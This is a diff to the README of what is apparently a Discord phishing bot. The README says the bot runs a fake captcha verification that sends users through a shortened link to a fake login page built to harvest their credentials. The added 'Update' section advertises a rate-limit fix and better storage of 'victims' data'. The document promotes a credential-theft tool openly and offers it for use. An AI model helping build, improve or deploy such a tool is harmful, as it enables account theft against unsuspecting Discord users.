@@ -26,6 +26,11 @@ Additionally, you need to update the API URL in the `util\verification\index.htm
 
 This code is a Discord bot that performs a fake captcha verification. When the verification button is pressed, a shortened link is generated, leading the user to a verification page. This page is actually a fake login page, designed to harvest user credentials.
 
+## Update
+
+- We have fixed a rate limit bug that was affecting the performance of our application. Now, the application handles rate limits more efficiently, ensuring smoother operation.
+- In addition, we have improved the way we save victims' data. The new method is more reliable and secure, providing better data integrity and protection for our users.
+
 <p align="center">
   <img src=https://cdn.discordapp.com/attachments/1194014723113488498/1194014759582969897/image.png?ex=65aecfe6&is=659c5ae6&hm=152a9bf28f6b239b7d59e457bf5fe80650ce97c240a4f4956a5d8d5237130e92&" width="45%" />
 </p>
